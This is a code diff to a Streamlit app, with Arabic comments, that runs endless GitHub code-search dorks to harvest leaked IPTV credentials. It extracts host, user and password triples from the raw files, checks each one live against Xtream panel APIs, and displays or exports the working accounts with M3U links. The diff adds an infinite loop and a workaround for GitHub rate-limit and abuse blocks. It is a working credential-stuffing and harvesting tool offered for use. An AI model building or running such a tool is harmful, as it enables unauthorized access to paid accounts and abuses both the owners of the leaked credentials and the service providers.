@@ -33,7 +33,7 @@ if not check_password():
 # =================================================
 # 2. إعدادات الواجهة
 # =================================================
-st.set_page_config(page_title="Ultra Beast V17 PRO", layout="wide")
+st.set_page_config(page_title="Ultra Beast V17 PRO - INFINITE", layout="wide")
 
 st.markdown("""
 <style>
@@ -57,34 +57,47 @@ if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
 if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
 if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()
 
+# إنشاء جلسة اتصال سريعة
+if 'req_session' not in st.session_state:
+    st.session_state.req_session = requests.Session()
+    st.session_state.req_session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    })
+
 # =================================================
 # 3. محرك الفحص والبيانات
 # =================================================
 
+def is_valid_syntax(host, user, pw):
+    # فلتر سريع لمنع فحص السيرفرات الوهمية لتوفير الوقت
+    bad_words = ['localhost', '127.0.0.1', 'your-ip', 'domain.com', 'server.com', 'example']
+    bad_users = ['user', 'test', 'username', 'pass', 'password', 'x']
+    if any(w in host.lower() for w in bad_words) or user.lower() in bad_users or pw.lower() in bad_users:
+        return False
+    return True
+
 def get_country(host):
     try:
         ip = host.split('//')[-1].split(':')[0]
-        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
+        res = st.session_state.req_session.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
         return res.get('country', 'Unknown')
     except: return "Global"
 
 def check_account(host, user, pw):
-    # منع التكرار قبل الفحص
+    if not is_valid_syntax(host, user, pw): return None
+    
     unique_key = f"{host}|{user}"
     if unique_key in st.session_state.seen_urls: return None
     st.session_state.seen_urls.add(unique_key)
 
     try:
-        # فحص كـ Xtream
         api_url = f"{host}/player_api.php?username={user}&password={pw}"
-        r = requests.get(api_url, timeout=3).json()
+        r = st.session_state.req_session.get(api_url, timeout=5).json()
         
         if r.get("user_info", {}).get("status") == "Active":
             info = r["user_info"]
             exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
             country = get_country(host)
-            
-            # توليد رابط M3U تلقائياً
             m3u_link = f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
             
             return {
@@ -93,6 +106,7 @@ def check_account(host, user, pw):
                 "country": country, "m3u": m3u_link
             }
     except: return None
+    return None
 
 # =================================================
 # 4. واجهة التحكم والتحميل
@@ -102,17 +116,23 @@ with st.sidebar:
     token = st.text_input("GitHub Token:", type="password")
     
     if st.button("🚀 ابدأ الصيد المليوني"):
-        if token: st.session_state.is_hunting = True
+        if token: 
+            st.session_state.is_hunting = True
+            st.rerun()
         else: st.warning("ضع التوكن أولاً!")
     
     if st.button("🛑 توقف"):
         st.session_state.is_hunting = False
+        st.rerun()
 
     st.divider()
-    st.metric("🔍 فحص", st.session_state.checked_count)
-    st.metric("💎 صيد", len(st.session_state.results))
     
-    # خاصية التحميل (Export)
+    # واجهة الإحصائيات الحية
+    stat_check = st.empty()
+    stat_found = st.empty()
+    stat_check.metric("🔍 تم فحص", st.session_state.checked_count)
+    stat_found.metric("💎 صيد صالح", len(st.session_state.results))
+    
     if st.session_state.results:
         st.subheader("📥 تحميل الصيد")
         export_data = ""
@@ -129,65 +149,95 @@ with st.sidebar:
 # =================================================
 # 5. منطقة العرض المباشر
 # =================================================
-st.subheader("📡 الرادار المباشر (V17)")
+st.subheader("📡 الرادار المباشر اللانهائي (V17 PRO)")
+status_log = st.empty()
 results_area = st.empty()
 
 def render_display():
-    with results_area.container():
-        for item in st.session_state.results:
-            st.markdown(f"""
-            <div class="card">
-                <div style="display:flex; justify-content:space-between;">
-                    <span class="host-text">{item['host']}</span>
-                    <span class="country-tag">🌍 {item['country']}</span>
-                </div>
-                <div style="margin-top:10px; font-size:14px; color:#ccc;">
-                    <b>USER:</b> {item['user']} | <b>PASS:</b> {item['pass']} <br>
-                    <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span> | <b>CONN:</b> {item['conn']}
-                </div>
-                <div style="background:#000; padding:5px; margin-top:5px; border-radius:4px; font-size:11px; color:#00ff41; overflow-x:auto;">
-                    M3U: {item['m3u']}
-                </div>
+    # تحديث العدادات الجانبية
+    stat_check.metric("🔍 تم فحص", st.session_state.checked_count)
+    stat_found.metric("💎 صيد صالح", len(st.session_state.results))
+    
+    # تحديث كروت النتائج
+    html_content = ""
+    for item in st.session_state.results:
+        html_content += f"""
+        <div class="card">
+            <div style="display:flex; justify-content:space-between;">
+                <span class="host-text">{item['host']}</span>
+                <span class="country-tag">🌍 {item['country']}</span>
             </div>
-            """, unsafe_allow_html=True)
+            <div style="margin-top:10px; font-size:14px; color:#ccc;">
+                <b>USER:</b> {item['user']} | <b>PASS:</b> {item['pass']} <br>
+                <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span> | <b>CONN:</b> {item['conn']}
+            </div>
+            <div style="background:#000; padding:5px; margin-top:5px; border-radius:4px; font-size:11px; color:#00ff41; overflow-x:auto;">
+                M3U: {item['m3u']}
+            </div>
+        </div>
+        """
+    results_area.markdown(html_content, unsafe_allow_html=True)
 
+# عرض النتائج القديمة إن وجدت
+if not st.session_state.is_hunting:
+    render_display()
+
+# --- محرك البحث اللانهائي (The Infinite Harvester) ---
 if st.session_state.is_hunting:
-    headers = {'Authorization': f'token {token}'}
+    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
     dorks = [
+        '"player_api.php" user pass extension:txt',
         'extension:txt "get.php?username="', 
         'filename:iptv.txt "password="', 
         'extension:m3u "http" "password="',
-        '"player_api.php" user pass extension:txt'
+        '"http://" "user" "pass" extension:m3u'
     ]
     
-    status_log = st.empty()
-
-    for dork in dorks:
-        if not st.session_state.is_hunting: break
-        for page in range(1, 11): # زيادة عدد الصفحات لتعطيك نتائج أكثر
+    # حلقة لا نهائية (لن يتوقف البرنامج إلا بضغطك على زر الإيقاف)
+    while st.session_state.is_hunting:
+        for dork in dorks:
             if not st.session_state.is_hunting: break
-            status_log.info(f"🔎 جاري فحص: {dork} | صفحة {page}")
             
-            try:
-                res = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}", headers=headers).json()
-                if 'items' in res:
-                    for item in res['items']:
+            for page in range(1, 15): # رفعنا عدد الصفحات لـ 15
+                if not st.session_state.is_hunting: break
+                
+                status_log.info(f"🔎 جاري فحص الرادار المستمر: {dork} | صفحة {page}")
+                
+                try:
+                    url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
+                    res = st.session_state.req_session.get(url, headers=headers).json()
+                    
+                    # نظام الحماية من حظر جيت هاب (لن يتوقف أبداً)
+                    if "message" in res and ("rate limit" in res["message"].lower() or "abuse" in res["message"].lower()):
+                        status_log.warning("⏳ الرادار يبرد محركاته (تخطي حظر جيت هاب)... سيستأنف الصيد بعد 30 ثانية.")
+                        time.sleep(30)
+                        continue # سيعيد المحاولة دون أن يغلق البرنامج
+                    
+                    items = res.get('items', [])
+                    if not items: break # إذا فرغت الصفحة انتقل للدورك الذي يليه
+                    
+                    for item in items:
+                        if not st.session_state.is_hunting: break
                         raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
-                        content = requests.get(raw_url, timeout=3).text
                         
-                        # Regex مطور لجلب جميع الصيغ
-                        matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
-                        
-                        for m in matches:
-                            st.session_state.checked_count += 1
-                            found = check_account(m[0], m[1], m[2])
-                            if found:
-                                st.session_state.results.insert(0, found)
-                                st.toast(f"🎯 صيد جديد من {found['country']}!", icon="🔥")
-                                render_display()
-            except: continue
-    
-    st.session_state.is_hunting = False
-    st.success("🏁 انتهت عملية البحث.")
-else:
-    render_display()
+                        try:
+                            content = st.session_state.req_session.get(raw_url, timeout=4).text
+                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
+                            
+                            for m in matches:
+                                st.session_state.checked_count += 1
+                                # فحص الحساب لايف للتأكد أنه يعمل
+                                found = check_account(m[0], m[1], m[2])
+                                if found:
+                                    st.session_state.results.insert(0, found)
+                                    render_display()
+                        except: continue
+                    
+                    time.sleep(3) # راحة بسيطة بين الصفحات لعدم إغضاب السيرفرات
+                except Exception as e:
+                    time.sleep(5)
+                    continue
+                
+        # استراحة بسيطة قبل إعادة دورة البحث من جديد
+        status_log.success("🔄 تم مسح جميع الكلمات، جاري إعادة تدوير الرادار للبحث عن تسريبات جديدة...")
+        time.sleep(10)
